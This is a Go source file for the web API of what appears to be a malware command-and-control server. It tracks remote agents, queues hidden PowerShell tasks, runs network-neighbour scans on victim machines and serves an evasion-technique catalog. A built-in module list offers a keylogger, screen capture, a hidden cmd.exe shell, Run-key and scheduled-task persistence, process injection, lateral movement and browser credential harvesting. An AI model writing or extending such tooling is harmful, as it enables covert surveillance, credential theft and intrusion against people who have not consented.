package api

import (
	"fmt"
	"strings"
	"time"

	"github.com/gin-gonic/gin"

	"chemicalumbra.dev/server/pkg/agent"
	"chemicalumbra.dev/server/pkg/task"
)

func statsHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		pending := 0
		completeToday := 0
		if taskQueue != nil {
			s := taskQueue.Stats()
			pending = s["pending"] + s["running"]
			completeToday = s["complete"]
		}
		active := 0
		total := 0
		if agentMgr != nil {
			active = agentMgr.CountActive()
			total = len(agentMgr.List())
		}
		c.JSON(200, gin.H{
			"active_agents":   active,
			"total_agents":    total,
			"pending_tasks":   pending,
			"completed_today": completeToday,
			"uptime_ms":       time.Since(startedAt).Milliseconds(),
		})
	}
}

func listAgentTasksHandler(taskQueue *task.Queue, kind string) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		if taskQueue == nil {
			c.JSON(200, []any{})
			return
		}
		tasks, err := taskQueue.GetByAgent(id, 80)
		if err != nil {
			c.JSON(200, []any{})
			return
		}
		out := make([]*task.Task, 0)
		for _, t := range tasks {
			blob := strings.ToLower(t.Command + " " + t.Args)
			if kind == "" || strings.Contains(blob, kind) || strings.Contains(blob, "shell") {
				out = append(out, t)
			}
		}
		c.JSON(200, out)
	}
}

func scanNetworkHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Subnet string `json:"subnet"`
			Range  string `json:"range"`
		}
		_ = c.ShouldBindJSON(&req)
		cidr := req.Subnet
		if cidr == "" {
			cidr = req.Range
		}
		if cidr == "" {
			cidr = "192.168.1.0/24"
		}
		cmd := fmt.Sprintf(`powershell -NoP -W Hidden -C "Write-Output ('SCAN %s'); Get-NetNeighbor -ErrorAction SilentlyContinue | Select-Object -ExpandProperty IPAddress -Unique"`, cidr)
		t, err := taskQueue.EnqueueShell(agentID, cmd, 5)
		if err != nil {
			c.JSON(500, gin.H{"error": err.Error()})
			return
		}
		c.JSON(200, gin.H{"id": t.ID, "status": t.Status, "targets": []string{}, "message": "scan queued on agent", "subnet": cidr})
	}
}

func listEvasionTechniquesHandler(c *gin.Context) {
	c.JSON(200, evasionCatalog.GetTechniques(""))
}

type moduleDef struct {
	ID           string   `json:"id"`
	Name         string   `json:"name"`
	Description  string   `json:"description"`
	Version      string   `json:"version"`
	Author       string   `json:"author"`
	Enabled      bool     `json:"enabled"`
	Capabilities []string `json:"capabilities"`
	Category     string   `json:"category"`
}

func builtinModules() []moduleDef {
	return []moduleDef{
		{ID: "keylogger", Name: "keylogger", Description: "Keystroke capture", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"keylog"}, Category: "surveillance"},
		{ID: "screenshot", Name: "screenshot", Description: "Screen capture", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"screenshot"}, Category: "surveillance"},
		{ID: "shell", Name: "shell", Description: "Hidden cmd.exe", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"shell"}, Category: "utility"},
		{ID: "persist", Name: "persistence", Description: "HKCU Run + schtasks", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"persist"}, Category: "persistence"},
		{ID: "processes", Name: "process_list", Description: "Enumerate processes", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"processes"}, Category: "utility"},
		{ID: "inject", Name: "process_inject", Description: "CRT / APC / early-bird", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"inject"}, Category: "evasion"},
		{ID: "lateral", Name: "lateral_movement", Description: "Remote exec via agent shell", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"lateral"}, Category: "lateral"},
		{ID: "harvest", Name: "credential_harvest", Description: "Browser / system creds", Version: "1.0", Author: "umbra", Enabled: true, Capabilities: []string{"creds"}, Category: "credential"},
	}
}

func queueModule(taskQueue *task.Queue, agentID, moduleID, action string) (*task.Task, error) {
	cmd := fmt.Sprintf(`powershell -NoP -W Hidden -C "Write-Output ('MODULE %s %s')"`, strings.ToUpper(action), moduleID)
	return taskQueue.EnqueueShell(agentID, cmd, 4)
}
